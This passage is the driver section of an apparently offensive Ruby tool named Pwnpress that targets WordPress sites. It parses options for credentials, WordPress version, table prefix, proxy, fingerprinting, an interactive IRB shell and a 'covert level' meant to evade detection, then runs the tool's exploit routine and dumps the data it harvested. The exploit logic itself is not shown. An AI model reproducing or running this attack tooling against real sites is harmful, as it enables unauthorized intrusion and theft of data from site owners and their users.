                OPTIONS[:username] = u
            end
            
            opts.on("-p", "--password PASSWD", "Valid password for 
user") do |p|
                OPTIONS[:password] = p
            end
            
            opts.on("-v", "--version VERSION", "Target (full) version") 
do |n|
                OPTIONS[:version] = n
            end
            
            opts.on("--prefix PREFIX", "Wordpress tables prefix (ex. 
wp)") do |x|
                OPTIONS[:table_prefix] = x
            end
            
            opts.on("-c", "--covert LEVEL", "Covert level (0-2)") do |c|
                OPTIONS[:covert_level] = c
            end
            
            opts.on("-i", "--irb", "Execute an interactive IRB shell") 
do |i|
                OPTIONS[:irb_shell] = i
            end
            
            opts.on("--proxy HOST:PORT", "Use proxy at given host and 
port") do |p|
                unless p =~ /(.*):(.*)/i
                    raise "Proxy setting must be in form: host:port"
                end
                proxy = p.scan(/(.*):(.*)/i).flatten!
                OPTIONS[:proxy_host] = proxy[0]
                OPTIONS[:proxy_port] = proxy[1].to_i
            end
            
            opts.on("-f", "--[no-]fingerprint", "Disable 
fingerprinting") do |f|
                OPTIONS[:fingerprint] = false
            end
            
            opts.separator ""
        end.parse!
    rescue
        puts "> Please check arguments validity. See --help."
        puts "Error: " + $!
        exit
    end
    
    vputs "Settings:"
    vputs "  target:      #{OPTIONS[:target]}"
    vputs "  fingerprint: #{OPTIONS[:fingerprint]}"
    vputs "  wp version:  #{OPTIONS[:version]}"
    
    if OPTIONS[:proxy_host] and OPTIONS[:proxy_port]
        vputs "  proxy host:  #{OPTIONS[:proxy_host]}"
        vputs "  proxy port:  #{OPTIONS[:proxy_port]}"
    end
    if OPTIONS[:username] and OPTIONS[:password]
        vputs "  username:    #{OPTIONS[:username]}"
        vputs "  password:    #{OPTIONS[:password]}"
    end

    # Seek. Target. Deliver.
    begin
        pwnInstance = Pwnpress.new(OPTIONS)
        
        if OPTIONS[:irb_shell]
            puts "> Executing interactive IRB shell, have fun."
            IRB.start
            puts "> Continuing..."
        end

        pwnInstance.exploit
        
        puts "> Finished. Dumping results, if any."
        if pwnInstance.results.size > 0
            puts ""
            pwnInstance.results.each do |r|
                $stderr.puts "-------------------- RESULTS: " + 
r[0].to_s
                $stderr.puts " Data type: " + r[1][:data_type].to_s
                $stderr.puts " Size:      " + r[1][:data].size.to_s
                
                # This obscure piece of code simply pretty-prints data 
contained
                # in a hash. We use a generic method to avoid code bloat 
and
                # do it as elegant as possible.
                r[1][:data].each do |n|
                    str = "\n" + (" " * 2) + n[0].to_s + "\n"
                    n[1].each do |i|
                        str << (" " * 3) + i[0].to_s
                        str << "\t : #{i[1].to_s}\n"
                    end
                    
                    $stderr.print(str)
                end
                puts ""
            end
        end
    rescue => e
        puts "> Error: #{e.message}"
        puts "> Ruby backtrace follows:"
        puts e.backtrace
    end
end

